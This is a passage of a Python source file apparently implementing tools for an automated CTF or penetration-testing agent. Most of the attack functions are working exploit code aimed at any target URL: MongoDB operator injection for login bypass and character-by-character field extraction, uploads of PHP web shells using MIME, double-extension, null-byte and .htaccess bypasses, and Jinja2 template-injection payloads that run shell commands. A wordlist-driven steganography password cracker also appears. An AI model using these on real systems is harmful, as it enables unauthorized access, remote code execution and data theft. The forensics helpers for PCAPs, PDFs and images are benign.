print(f'Forged token: {{h}}.{{p}}.{{sig_b64}}')
print(f'Payload: {{json.dumps(payload, indent=2)}}')
"""
        return tool_execute_python(code, timeout=5)

    return "Operations: analyze, alg_none, rs256_hs256, kid_injection, jku_redirect, crack, forge"


def tool_nosql_inject(target_url: str, operation: str = "probe",
                       param: str = "username", password_param: str = "password",
                       method: str = "POST", charset: str = "0123456789abcdefghijklmnopqrstuvwxyz_-{}",
                       headers: dict = None, cookies: dict = None,
                       field: str = "username", data_format: str = "form") -> str:
    """NoSQL (MongoDB) injection tester wrapping NoSQLMap + custom operators.
    Ops: probe (test if endpoint is vulnerable to MongoDB operator injection),
    auth_bypass (attempt $ne/$gt/$regex auth bypass to login without credentials),
    extract_field (extract field values char-by-char using $regex injection),
    js_inject (test MongoDB $where JavaScript injection),
    nosqlmap (shell to NoSQLMap tool for full scan)."""

    hdrs = headers or {}
    cks  = cookies or {}

    def _post(data):
        code = f"""
import requests, json, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks = {repr(cks)}
data = {repr(data)}
method = {repr(method)}
fmt = {repr(data_format)}
try:
    if method == 'POST':
        if fmt == 'json':
            r = requests.post(url, json=data, headers=hdrs, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data=data, headers=hdrs, cookies=cks, timeout=8, verify=False)
    else:
        r = requests.get(url, params=data, headers=hdrs, cookies=cks, timeout=8, verify=False)
    print(f'{{r.status_code}} {{len(r.text)}} {{r.text[:200]}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "probe":
        # Test basic operator injection
        results = []
        tests = [
            {param: {"$ne": ""}, password_param: {"$ne": ""}},
            {param: {"$gt": ""}, password_param: {"$gt": ""}},
            {param: "admin", password_param: {"$ne": "wrong"}},
            {param: {"$regex": ".*"}, password_param: {"$ne": ""}},
        ]
        for t in tests:
            r = _post(t)
            results.append(f"payload={t} → {r[:100]}")
        return "\n".join(results)

    if operation == "auth_bypass":
        code = f"""
import requests, json, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}
fmt  = {repr(data_format)}

bypasses = [
    {{'{param}': {{'$ne': ''}}, '{password_param}': {{'$ne': ''}}}},
    {{'{param}': {{'$gt': ''}}, '{password_param}': {{'$gt': ''}}}},
    {{'{param}': 'admin', '{password_param}': {{'$ne': 'x'}}}},
    {{'{param}': {{'$regex': '.*'}}, '{password_param}': {{'$ne': ''}}}},
    {{'{param}': {{'$exists': True}}, '{password_param}': {{'$exists': True}}}},
]

for b in bypasses:
    try:
        if fmt == 'json':
            r = requests.post(url, json=b, headers=hdrs, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data=b, headers=hdrs, cookies=cks, timeout=8, verify=False)
        success = r.status_code in (200,302) and 'wrong' not in r.text.lower() and 'invalid' not in r.text.lower()
        tag = '[BYPASS?]' if success else '[fail]'
        print(f'{{tag}} {{b}} → {{r.status_code}} {{r.text[:80]}}')
    except Exception as ex:
        print(f'[err] {{ex}}')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "extract_field":
        code = f"""
import requests, urllib3, time
urllib3.disable_warnings()
url = {repr(target_url)}
field = {repr(field)}
charset = {repr(charset)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}
fmt  = {repr(data_format)}

def test_prefix(prefix):
    payload = {{'{param}': {{'$regex': f'^{{prefix}}'}}, '{password_param}': {{'$ne': 'x'}}}}
    try:
        if fmt == 'json':
            r = requests.post(url, json=payload, headers=hdrs, cookies=cks, timeout=5, verify=False)
        else:
            r = requests.post(url, data=payload, headers=hdrs, cookies=cks, timeout=5, verify=False)
        return r.status_code == 200 and 'wrong' not in r.text.lower()
    except: return False

found = ''
for pos in range(32):
    for c in charset:
        if test_prefix(found + c):
            found += c
            print(f'[+] {{field}} starts with: {{found}}')
            break
    else:
        print(f'Extraction complete: {{found}}')
        break
"""
        return tool_execute_python(code, timeout=120)

    if operation == "js_inject":
        code = f"""
import requests, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}

tests = [
    {{'{param}': {{'$where': 'this.username == this.username'}}, '{password_param}': 'x'}},
    {{'{param}': {{'$where': '1==1'}}, '{password_param}': 'x'}},
    {{'{param}': {{'$where': 'sleep(2000)'}}, '{password_param}': 'x'}},
]
for t in tests:
    import time
    t0 = time.time()
    try:
        r = requests.post(url, json=t, headers=hdrs, cookies=cks, timeout=10, verify=False)
        elapsed = time.time() - t0
        print(f'{{t}} → {{r.status_code}} {{elapsed:.2f}}s {{r.text[:80]}}')
    except Exception as ex:
        print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "nosqlmap":
        result = _shell(f"python3 nosqlmap.py --attack 0 --victim {target_url} 2>&1 | head -40", timeout=60)
        if "not found" in result:
            return ("NoSQLMap not installed.\nInstall: git clone https://github.com/codingo/NoSQLMap\n"
                    "pip install -r requirements.txt\nFallback: use operation=auth_bypass or extract_field")
        return result

    return "Operations: probe, auth_bypass, extract_field, js_inject, nosqlmap"


def tool_file_upload(target_url: str, operation: str = "probe",
                      upload_param: str = "file", code_param: str = "",
                      code_content: str = "", filename: str = "test.php",
                      output_dir: str = "/tmp/upload_test",
                      headers: dict = None, cookies: dict = None) -> str:
    """File upload exploitation — MIME spoofing, double extension, .htaccess, polyglot.
    Ops: probe (try multiple upload bypass techniques and check which succeed),
    mime_spoof (upload with mismatched Content-Type header),
    double_ext (upload file.php.jpg — double extension bypass),
    htaccess (upload .htaccess to enable PHP in image dir),
    null_byte (filename null byte injection — file.php%00.jpg),
    fuxploider (shell to fuxploider for automated bypass detection)."""

    hdrs = headers or {}
    cks  = cookies or {}
    _shell(f"mkdir -p '{output_dir}'")

    def _upload(fname, content, content_type):
        code = f"""
import requests, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}
files = {{'{upload_param}': ({repr(fname)}, {repr(content)}, {repr(content_type)})}}
try:
    r = requests.post(url, files=files, headers=hdrs, cookies=cks, timeout=10, verify=False)
    print(f'{{r.status_code}} {{r.text[:200]}}')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "probe":
        results = []
        test_content = b"<?php phpinfo(); ?>"
        tests = [
            ("test.php",      "image/jpeg"),
            ("test.php.jpg",  "image/jpeg"),
            ("test.pHp",      "image/jpeg"),
            ("test.php5",     "application/octet-stream"),
            (".htaccess",     "text/plain"),
            ("test.php\x00.jpg", "image/jpeg"),
        ]
        for fname, ct in tests:
            r = _upload(fname, test_content, ct)
            results.append(f"[{fname}] ({ct}) → {r[:80]}")
        return "\n".join(results)

    if operation == "mime_spoof":
        r = _upload(filename, code_content.encode() if code_content else b"<?php system($_GET['cmd']); ?>", "image/jpeg")
        return f"Uploaded {filename} with image/jpeg content-type:\n{r}"

    if operation == "double_ext":
        fname = filename if "." in filename else filename + ".php.jpg"
        if not fname.endswith(".php.jpg") and ".php" in fname:
            base = fname.rsplit(".", 1)[0]
            fname = base + ".jpg"
        r = _upload(fname, code_content.encode() if code_content else b"<?php system($_GET['cmd']); ?>", "image/jpeg")
        return f"Uploaded {fname}:\n{r}"

    if operation == "htaccess":
        htaccess_content = b"AddType application/x-httpd-php .jpg\nAddType application/x-httpd-php .png"
        r = _upload(".htaccess", htaccess_content, "text/plain")
        return f".htaccess upload result:\n{r}"

    if operation == "null_byte":
        fname = filename.replace(".jpg", ".php\x00.jpg") if ".jpg" in filename else filename + ".php\x00.jpg"
        r = _upload(fname, code_content.encode() if code_content else b"<?php system($_GET['cmd']); ?>", "image/jpeg")
        return f"Null byte upload ({repr(fname)}):\n{r}"

    if operation == "fuxploider":
        result = _shell(f"fuxploider --url '{target_url}' --not-ssl 2>&1 | head -50", timeout=60)
        if "not found" in result:
            return ("fuxploider not installed.\nInstall: pip install fuxploider\n"
                    "Or: git clone https://github.com/almandin/fuxploider\n"
                    "Fallback: use operation=probe for manual testing")
        return result

    return "Operations: probe, mime_spoof, double_ext, htaccess, null_byte, fuxploider"


def tool_template_inject(target_url: str = "", operation: str = "probe",
                          param: str = "input", method: str = "GET",
                          engine: str = "auto", headers: dict = None,
                          cookies: dict = None, data: str = "") -> str:
    """SSTI blind probe + filter bypass wrapping tplmap.
    Ops: probe (comprehensive SSTI detection across all engines),
    blind_probe (boolean-based blind SSTI when output is filtered),
    tplmap (shell to tplmap for full automation + RCE),
    filter_bypass (Jinja2/Twig payloads that avoid common WAF filters),
    polyglot (single probe that triggers multiple engines simultaneously)."""

    hdrs = headers or {}
    cks  = cookies or {}

    if operation == "tplmap":
        result = _shell(
            f"python3 /opt/tplmap/tplmap.py -u '{target_url}' -d '{param}=*' 2>&1 | head -60",
            timeout=60)
        if "not found" in result or "No such" in result:
            result = _shell("tplmap 2>&1 | head -5", timeout=5)
        if "not found" in result or "No such" in result:
            return ("tplmap not installed.\nInstall: git clone https://github.com/epinna/tplmap\n"
                    "Fallback: use operation=probe for manual detection")
        return result

    if operation in ("probe", "blind_probe"):
        # Delegate to existing ssti_rce for the probe
        return tool_ssti_rce(
            operation="detect",
            engine="auto",
            target_url=target_url,
            param=param,
            method=method,
            headers=headers,
            cookies=cookies
        )

    if operation == "filter_bypass":
        code = f"""
import requests, urllib3, json
urllib3.disable_warnings()
url = {repr(target_url)}
param = {repr(param)}
method = {repr(method)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}

# Filter-bypass payloads for Jinja2 without underscores/dots/brackets
bypass_payloads = [
    # No underscores - use |attr() filter
    "{{% set x = request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f') %}}{{% set y = x|attr('\\x5f\\x5fbuiltins\\x5f\\x5f') %}}{{% set z = y|attr('\\x5f\\x5fimport\\x5f\\x5f') %}}{{% set os = z('os') %}}{{{{os.popen('id').read()}}}}",
    # Using request.args
    "{{{{request['application']['__globals__']['__builtins__']['__import__']('os').popen('id').read()}}}}",
    # lipsum global
    "{{{{lipsum['__globals__']['os']['popen']('id')['read']()}}}}",
    # cycler
    "{{{{cycler.__init__.__globals__.os.popen('id').read()}}}}",
    # joiner
    "{{{{joiner.__init__.__globals__.os.popen('id').read()}}}}",
    # namespace
    "{{{{namespace.__init__.__globals__.os.popen('id').read()}}}}",
]

for p in bypass_payloads[:3]:
    try:
        if method == 'GET':
            r = requests.get(url, params={{param: p}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
        else:
            r = requests.post(url, data={{param: p}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
        uid_hit = 'uid=' in r.text or 'root' in r.text
        print(f'[{{"HIT" if uid_hit else "miss"}}] {{p[:60]}} → {{r.status_code}} {{r.text[:100]}}')
    except Exception as ex:
        print(f'[err] {{ex}}')
"""
        return tool_execute_python(code, timeout=30)

    if operation == "polyglot":
        # Single probe that triggers Jinja2, Twig, Freemarker simultaneously
        probe = "{{7*7}}${7*7}#{7*7}*{7*7}@(7*7)"
        code = f"""
import requests, urllib3
urllib3.disable_warnings()
url = {repr(target_url)}
probe = {repr(probe)}
param = {repr(param)}
method = {repr(method)}
hdrs = {repr(hdrs)}
cks  = {repr(cks)}

if method == 'GET':
    r = requests.get(url, params={{param: probe}}, headers=hdrs, cookies=cks, timeout=8, verify=False)
else:
    r = requests.post(url, data={{param: probe}}, headers=hdrs, cookies=cks, timeout=8, verify=False)

import re
found = re.findall(r'\\b49\\b', r.text)
print(f'Polyglot probe response (status={{r.status_code}}):')
print(r.text[:300])
if found:
    print(f'[!] "49" (7*7) found in response — SSTI CONFIRMED')
"""
        return tool_execute_python(code, timeout=10)

    return "Operations: probe, blind_probe, tplmap, filter_bypass, polyglot"


def tool_steg_brute(image_path: str, operation: str = "auto",
                     wordlist: str = "/usr/share/wordlists/rockyou.txt",
                     output_dir: str = "/tmp/steg_extracted") -> str:
    """Steganography password brute-force wrapping stegseek + stegcracker.
    Ops: auto (stegseek fastest, fallback stegcracker, fallback empty password),
    stegseek (stegseek — fastest steghide cracker, uses rockyou),
    stegcracker (stegcracker Python tool — slower but more formats),
    steghide_empty (try steghide with no password),
    outguess_crack (try outguess with wordlist),
    all_tools (run every tool in sequence until one succeeds)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""
    _shell(f"mkdir -p '{output_dir}'")
    out_file = f"{output_dir}/extracted_{int(time.time())}"

    if operation in ("auto", "stegseek"):
        result = _shell(f"stegseek '{sp}' '{wordlist}' '{out_file}' 2>&1", timeout=120)
        if "not found" in result or "command not found" in result:
            if operation == "stegseek":
                return ("stegseek not installed.\nInstall: apt install stegseek\n"
                        "Or download: https://github.com/RickdeJager/stegseek/releases\n"
                        "Fast install: dpkg -i stegseek_*.deb")
        else:
            if "Found passphrase" in result or "wrote" in result.lower():
                content = _shell(f"cat '{out_file}' 2>/dev/null || strings '{out_file}' 2>/dev/null | head -20", timeout=5)
                return f"{result}\n\nExtracted content:\n{content}"
            return result
        if operation == "auto":
            # Fall through to empty password
            pass

    if operation in ("auto", "steghide_empty"):
        result = _shell(f"steghide extract -sf '{sp}' -p '' -f -o '{out_file}_empty' 2>&1", timeout=15)
        if "wrote" in result or "extracted" in result.lower():
            content = _shell(f"cat '{out_file}_empty' 2>/dev/null || strings '{out_file}_empty' 2>/dev/null | head -20", timeout=5)
            return f"steghide (empty password) success!\n{result}\n\nContent:\n{content}"
        if operation == "steghide_empty":
            return result

    if operation in ("auto", "stegcracker"):
        result = _shell(f"stegcracker '{sp}' '{wordlist}' 2>&1 | tail -20", timeout=180)
        if "not found" in result or "command not found" in result:
            # pip fallback
            result2 = _shell(f"python3 -m stegcracker '{sp}' '{wordlist}' 2>&1 | tail -20", timeout=180)
            if "not found" in result2:
                if operation == "stegcracker":
                    return "stegcracker not installed.\nInstall: pip install stegcracker"
                return "All steg brute tools unavailable. Install: stegseek OR pip install stegcracker"
            return result2
        return result

    if operation == "outguess_crack":
        code = f"""
import subprocess
sp = {repr(sp)}
out = {repr(out_file)}
wl = {repr(wordlist)}
found = False
with open(wl, 'r', errors='replace') as f:
    for i, line in enumerate(f):
        pw = line.strip()
        r = subprocess.run(['outguess', '-k', pw, '-r', sp, out+'_og'],
                           capture_output=True, text=True, timeout=5)
        if r.returncode == 0 and 'writing' in r.stderr.lower():
            print(f'[+] outguess passphrase: {{repr(pw)}}')
            found = True
            break
        if i % 1000 == 0:
            print(f'Tried {{i}} passwords...')
        if i > 50000:
            print('Stopped at 50000 attempts')
            break
if not found:
    print('outguess crack failed')
"""
        return tool_execute_python(code, timeout=180)

    if operation == "all_tools":
        results = []
        for op in ("steghide_empty", "stegseek", "stegcracker"):
            r = tool_steg_brute(sp, op, wordlist, output_dir)
            results.append(f"=== {op} ===\n{r}")
            if "success" in r.lower() or "Found passphrase" in r or "wrote" in r.lower():
                break
        return "\n\n".join(results)

    return "Operations: auto, stegseek, stegcracker, steghide_empty, outguess_crack, all_tools"


def tool_pcap_reassemble(pcap_path: str, operation: str = "auto",
                          output_dir: str = "", stream_id: int = 0,
                          filter_expr: str = "", keyword: str = "") -> str:
    """PCAP file reconstruction wrapping tshark --export-objects + tcpflow + foremost.
    Ops: auto (export all objects from all protocols, search for flags),
    http_objects (tshark export HTTP objects — files transferred over HTTP),
    ftp_objects (tshark export FTP-DATA — files transferred over FTP),
    tcp_stream (reconstruct single TCP stream to file),
    all_streams (tcpflow — reconstruct every TCP stream to separate files),
    find_files (run foremost/binwalk on all reconstructed data to find embedded files)."""

    sp = (_w2l(pcap_path) if (IS_WINDOWS and USE_WSL) else pcap_path) if pcap_path else ""
    od = output_dir or f"/tmp/pcap_reassemble_{int(time.time())}"
    _shell(f"mkdir -p '{od}'")

    if operation in ("auto", "http_objects"):
        result = _shell(f"tshark -r '{sp}' --export-objects http,'{od}/http' 2>&1 && "
                       f"ls -la '{od}/http' 2>/dev/null | head -20 && "
                       f"strings '{od}/http'/* 2>/dev/null | grep -iE 'picoCTF|flag{{|ctf{{' | head -10",
                       timeout=30)
        if operation == "http_objects": return result

    if operation in ("auto", "ftp_objects"):
        result_ftp = _shell(f"tshark -r '{sp}' --export-objects ftp-data,'{od}/ftp' 2>&1 && "
                            f"ls -la '{od}/ftp' 2>/dev/null | head -20 && "
                            f"strings '{od}/ftp'/* 2>/dev/null | grep -iE 'picoCTF|flag{{|ctf{{' | head -10",
                            timeout=30)
        if operation == "ftp_objects": return result_ftp

    if operation == "tcp_stream":
        return _shell(f"tshark -r '{sp}' -q -z follow,tcp,raw,{stream_id} 2>&1 | "
                     f"grep -v '^===\\|^\\s*$\\|^Follow' | xxd -r -p > '{od}/stream_{stream_id}.bin' 2>/dev/null && "
                     f"file '{od}/stream_{stream_id}.bin' && "
                     f"strings '{od}/stream_{stream_id}.bin' | head -30",
                     timeout=20)

    if operation == "all_streams":
        result = _shell(f"tcpflow -r '{sp}' -o '{od}' 2>&1 || "
                       f"tshark -r '{sp}' -T fields -e tcp.stream 2>/dev/null | sort -u | "
                       f"xargs -I{{}} tshark -r '{sp}' -q -z follow,tcp,raw,{{}} 2>/dev/null | head -5",
                       timeout=60)
        ls = _shell(f"ls -la '{od}' | head -20", timeout=5)
        grep = _shell(f"strings '{od}'/* 2>/dev/null | grep -iE 'picoCTF|flag{{|ctf{{' | head -20", timeout=10)
        return f"{result}\n\nFiles:\n{ls}\n\nFlag search:\n{grep}"

    if operation == "find_files":
        binwalk_out = _shell(f"binwalk -e -C '{od}' '{sp}' 2>&1 | head -30", timeout=30)
        foremost_out = _shell(f"foremost -i '{sp}' -o '{od}/foremost' 2>&1 | head -20 && "
                             f"ls '{od}/foremost'/* 2>/dev/null | head -20", timeout=30)
        return f"Binwalk:\n{binwalk_out}\n\nForemost:\n{foremost_out}"

    # auto: run all and return combined
    return "\n\n".join([
        f"=== HTTP objects → {od}/http ===\n" + _shell(f"tshark -r '{sp}' --export-objects http,'{od}/http' 2>&1 && ls '{od}/http' 2>/dev/null | head -10 && strings '{od}/http'/* 2>/dev/null | grep -iE 'picoCTF|flag{{' | head -5", timeout=20),
        f"=== FTP objects → {od}/ftp ===\n" + _shell(f"tshark -r '{sp}' --export-objects ftp-data,'{od}/ftp' 2>&1 && ls '{od}/ftp' 2>/dev/null | head -10", timeout=20),
        f"=== All TCP streams → {od}/streams ===\n" + _shell(f"mkdir -p '{od}/streams' && tcpflow -r '{sp}' -o '{od}/streams' 2>&1 | head -10 || echo 'tcpflow not installed: apt install tcpflow'", timeout=20),
    ])


def tool_pdf_forensics(pdf_path: str, operation: str = "analyze",
                        output_dir: str = "") -> str:
    """PDF forensics wrapping peepdf + pdf-parser.py (Didier Stevens) + pikepdf.
    Ops: analyze (full scan — JS, embedded files, streams, metadata),
    extract_js (extract JavaScript from PDF actions and objects),
    extract_embedded (extract embedded files from /EmbeddedFiles),
    decompress_streams (decompress all FlateDecode/LZWDecode streams),
    find_hidden (search for steganographic content, whitespace encoding, hidden layers),
    metadata (dump all XMP/DocInfo metadata)."""

    sp = (_w2l(pdf_path) if (IS_WINDOWS and USE_WSL) else pdf_path) if pdf_path else ""
    od = output_dir or f"/tmp/pdf_forensics_{int(time.time())}"
    _shell(f"mkdir -p '{od}'")

    if operation in ("analyze", "extract_js"):
        # Try peepdf first
        result = _shell(f"peepdf -f -i '{sp}' 2>&1 | head -60", timeout=20)
        if "not found" in result or "command not found" in result:
            # Fallback: pdf-parser.py
            result = _shell(f"python3 pdf-parser.py --search /JavaScript '{sp}' 2>&1 | head -40 || "
                           f"python3 ~/.local/bin/pdf-parser.py --search /JavaScript '{sp}' 2>&1 | head -40",
                           timeout=20)
        if "not found" in result:
            # Pure Python fallback with pikepdf
            result = tool_execute_python(f"""
try:
    import pikepdf, json
    with pikepdf.open({repr(sp)}) as pdf:
        print(f'Pages: {{len(pdf.pages)}}')
        print(f'Info: {{dict(pdf.docinfo)}}')
        # Search for JS
        if '/Names' in pdf.Root:
            names = pdf.Root['/Names']
            if '/JavaScript' in names:
                print('[!] JavaScript found in /Names/JavaScript')
        # Search for embedded files
        if '/Names' in pdf.Root and '/EmbeddedFiles' in pdf.Root['/Names']:
            print('[!] Embedded files found')
        # Dump all stream objects
        for i, obj in enumerate(pdf.objects):
            try:
                if hasattr(obj, 'read_bytes'):
                    data = obj.read_bytes()
                    printable = ''.join(chr(b) if 32<=b<=126 else '.' for b in data[:200])
                    if any(kw in printable for kw in ['flag','ctf','picoCTF','password']):
                        print(f'[!] Object {{i}}: {{printable[:200]}}')
            except: pass
except ImportError:
    print('pikepdf not installed. Install: pip install pikepdf')
except Exception as ex:
    print(f'Error: {{ex}}')
""", timeout=20)
        return result

    if operation == "extract_embedded":
        code = f"""
try:
    import pikepdf, os
    od = {repr(od)}
    with pikepdf.open({repr(sp)}) as pdf:
        if '/Names' in pdf.Root and '/EmbeddedFiles' in pdf.Root.get('/Names', {{}}):
            ef = pdf.Root['/Names']['/EmbeddedFiles']
            names = ef.get('/Names', [])
            for i in range(0, len(names), 2):
                fname = str(names[i])
                fspec = names[i+1]
                if '/EF' in fspec:
                    data = fspec['/EF']['/F'].read_bytes()
                    out_path = os.path.join(od, fname.strip('/'))
                    with open(out_path, 'wb') as f: f.write(data)
                    print(f'Extracted: {{out_path}} ({{len(data)}} bytes)')
        else:
            print('No embedded files found in /EmbeddedFiles')
            # Check attachments
            for page in pdf.pages:
                if '/Annots' in page:
                    for annot in page['/Annots']:
                        if annot.get('/Subtype') == '/FileAttachment':
                            print(f'  File attachment found on page')
except ImportError:
    print('pikepdf not installed. Install: pip install pikepdf')
except Exception as ex:
    print(f'Error: {{ex}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "decompress_streams":
        code = f"""
try:
    import pikepdf
    od = {repr(od)}
    with pikepdf.open({repr(sp)}) as pdf:
        found = 0
        for i, obj in enumerate(pdf.objects):
            try:
                if hasattr(obj, 'read_bytes'):
                    data = obj.read_bytes()
                    if len(data) > 10:
                        out_path = f'{{od}}/stream_{{i:04d}}.bin'
                        with open(out_path, 'wb') as f: f.write(data)
                        # Check for interesting content
                        text = data.decode(errors='replace')
                        if any(kw in text for kw in ['flag','ctf','picoCTF','password','secret']):
                            print(f'[!] Interesting stream {{i}}: {{text[:200]}}')
                        found += 1
            except: pass
        print(f'Extracted {{found}} streams to {{od}}')
except ImportError:
    print('pikepdf not installed. Install: pip install pikepdf')
"""
        return tool_execute_python(code, timeout=20)

    if operation == "metadata":
        return (_shell(f"exiftool '{sp}' 2>&1 | head -40", timeout=10) + "\n" +
                _shell(f"pdfinfo '{sp}' 2>&1 | head -30", timeout=10))

    if operation == "find_hidden":
        code = f"""
import re
with open({repr(sp)}, 'rb') as f: data = f.read()
# Look for strings in raw PDF
text = data.decode(errors='replace')
patterns = [r'picoCTF\\{{[^}}]+\\}}', r'flag\\{{[^}}]+\\}}', r'CTF\\{{[^}}]+\\}}']
for pat in patterns:
    matches = re.findall(pat, text, re.IGNORECASE)
    if matches:
        print(f'[!] FOUND: {{matches}}')
# Look for suspicious whitespace encoding (zero-width chars, spaces)
hidden = re.findall(r'[\\x00-\\x08\\x0e-\\x1f][\\x20-\\x7e]{{4,}}', data.decode(errors='replace'))
if hidden:
    print(f'Hidden content candidates: {{hidden[:5]}}')
# Check for layers/optional content
if b'/OCG' in data or b'/OCProperties' in data:
    print('[!] Optional Content Groups (layers) found — may hide content')
# Check for steganography in embedded images
print(f'Raw strings with flag keywords:')
for m in re.finditer(b'(?:flag|picoCTF|ctf).*', data, re.IGNORECASE):
    print(f'  {{m.group()[:80]}}')
"""
        return tool_execute_python(code, timeout=15)

    return "Operations: analyze, extract_js, extract_embedded, decompress_streams, metadata, find_hidden"


def tool_image_repair(image_path: str, operation: str = "detect",
                       width: int = 0, height: int = 0,
                       output_path: str = "") -> str:
    """Corrupted image repair using pngcheck + PIL/struct header patching.
    Ops: detect (identify corruption type — wrong magic, wrong dimensions, bad CRC),
    fix_png_header (repair PNG magic bytes and IHDR chunk),
    fix_jpeg_markers (repair JPEG SOI/EOI markers and scan for valid markers),
    restore_dimensions (patch width/height in PNG IHDR — common CTF trick),
    fix_bmp_header (repair BMP file header and DIB header),
    check_crc (recompute PNG chunk CRCs and report mismatches)."""

    sp = (_w2l(image_path) if (IS_WINDOWS and USE_WSL) else image_path) if image_path else ""
    out = output_path or sp + ".repaired"

    if operation == "detect":
        pngcheck_out = _shell(f"pngcheck '{sp}' 2>&1", timeout=10)
        file_out = _shell(f"file '{sp}' 2>&1", timeout=5)
        code = f"""
with open({repr(sp)}, 'rb') as f: data = f.read()
magic = data[:16].hex()
print(f'Magic bytes: {{magic}}')
print(f'File size: {{len(data)}} bytes')

# PNG magic: 89504e470d0a1a0a
# JPEG magic: ffd8ff
# BMP magic: 4d42
# GIF magic: 47494638

if data[:8] == b'\\x89PNG\\r\\n\\x1a\\n':
    print('PNG: valid magic')
    # Check IHDR
    if len(data) > 24:
        import struct
        w = struct.unpack('>I', data[16:20])[0]
        h = struct.unpack('>I', data[20:24])[0]
        bd = data[24]
        ct = data[25]
        print(f'PNG IHDR: width={{w}} height={{h}} bit_depth={{bd}} color_type={{ct}}')
        if w == 0 or h == 0: print('[!] Invalid dimensions — likely corrupted IHDR')
        if w > 10000 or h > 10000: print('[!] Suspicious large dimensions')
elif data[:2] == b'\\xff\\xd8':
    print('JPEG: valid magic')
elif data[:2] == b'BM':
    print('BMP: valid magic')
    import struct
    file_size = struct.unpack('<I', data[2:6])[0]
    data_offset = struct.unpack('<I', data[10:14])[0]
    w = struct.unpack('<I', data[18:22])[0]
    h = struct.unpack('<I', data[22:26])[0]
    print(f'BMP: file_size={{file_size}} data_offset={{data_offset}} w={{w}} h={{h}}')
else:
    print(f'[!] Unrecognized magic: {{data[:8].hex()}}')
    print('Expected: PNG=89504e47, JPEG=ffd8ff, BMP=424d, GIF=47494638')
"""
        return f"pngcheck: {pngcheck_out}\nfile: {file_out}\n" + tool_execute_python(code, timeout=10)

    if operation == "fix_png_header":
        code = f"""
import struct, binascii
with open({repr(sp)}, 'rb') as f: data = bytearray(f.read())
PNG_MAGIC = b'\\x89PNG\\r\\n\\x1a\\n'
if data[:8] != PNG_MAGIC:
    print(f'Fixing PNG magic: {{data[:8].hex()}} → {{PNG_MAGIC.hex()}}')
    data[:8] = PNG_MAGIC
# Verify IHDR CRC
if len(data) > 33:
    ihdr_data = data[12:29]  # type + IHDR content
    crc_stored = struct.unpack('>I', data[29:33])[0]
    crc_calc = binascii.crc32(ihdr_data) & 0xffffffff
    if crc_stored != crc_calc:
        print(f'Fixing IHDR CRC: {{hex(crc_stored)}} → {{hex(crc_calc)}}')
        data[29:33] = struct.pack('>I', crc_calc)
with open({repr(out)}, 'wb') as f: f.write(data)
print(f'Saved: {repr(out)}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "restore_dimensions":
        if not width or not height: return "Provide width= and height= (correct dimensions)"
        code = f"""
import struct, binascii
with open({repr(sp)}, 'rb') as f: data = bytearray(f.read())
old_w = struct.unpack('>I', data[16:20])[0]
old_h = struct.unpack('>I', data[20:24])[0]
data[16:20] = struct.pack('>I', {width})
data[20:24] = struct.pack('>I', {height})
print(f'Changed: {{old_w}}x{{old_h}} → {width}x{height}')
# Recompute IHDR CRC (bytes 12-28 are chunk type+data)
ihdr_data = bytes(data[12:29])
new_crc = binascii.crc32(ihdr_data) & 0xffffffff
data[29:33] = struct.pack('>I', new_crc)
with open({repr(out)}, 'wb') as f: f.write(data)
print(f'Saved: {repr(out)}')
# Try to open
from PIL import Image
try:
    img = Image.open({repr(out)})
    print(f'PIL: {width}x{height} mode={{img.mode}}')
    img.save({repr(out.replace('.repaired','_preview.png'))})
except Exception as ex:
    print(f'PIL error: {{ex}}')
"""
        return tool_execute_python(code, timeout=15)

    if operation == "fix_jpeg_markers":
        code = f"""
with open({repr(sp)}, 'rb') as f: data = bytearray(f.read())
# Ensure SOI marker at start
if data[:2] != b'\\xff\\xd8':
    print(f'Adding SOI marker (was {{data[:2].hex()}})')
    data = bytearray(b'\\xff\\xd8') + data
# Ensure EOI marker at end
if data[-2:] != b'\\xff\\xd9':
    print(f'Adding EOI marker')
    data += b'\\xff\\xd9'
# Find JFIF/EXIF APP0
markers = []
i = 0
while i < len(data)-1:
    if data[i] == 0xFF and data[i+1] not in (0x00, 0xFF):
        markers.append((i, hex(data[i+1])))
        i += 2
    else:
        i += 1
print(f'JPEG markers: {{markers[:10]}}')
with open({repr(out)}, 'wb') as f: f.write(data)
print(f'Saved: {repr(out)}')
"""
        return tool_execute_python(code, timeout=10)

    if operation == "check_crc":
        code = f"""
import struct, binascii
with open({repr(sp)}, 'rb') as f: data = f.read()
if data[:8] != b'\\x89PNG\\r\\n\\x1a\\n':
    print('Not a valid PNG file')
    exit()
i = 8
chunk_num = 0
while i < len(data):
    if i+8 > len(data): break
    length = struct.unpack('>I', data[i:i+4])[0]
    chunk_type = data[i+4:i+8].decode(errors='replace')
    chunk_data = data[i+4:i+8+length]
    crc_stored = struct.unpack('>I', data[i+8+length:i+12+length])[0]
    crc_calc   = binascii.crc32(chunk_data) & 0xffffffff
    ok = 'OK' if crc_stored == crc_calc else f'[!] MISMATCH stored={{hex(crc_stored)}} calc={{hex(crc_calc)}}'
    print(f'Chunk {{chunk_num:2d}}: {{chunk_type}} len={{length}} CRC={{ok}}')
    chunk_num += 1
    i += 12 + length
    if chunk_type == 'IEND': break
"""
        return tool_execute_python(code, timeout=10)

    return "Operations: detect, fix_png_header, fix_jpeg_markers, restore_dimensions, fix_bmp_header, check_crc"


def tool_compression(file_path: str = "", operation: str = "detect",
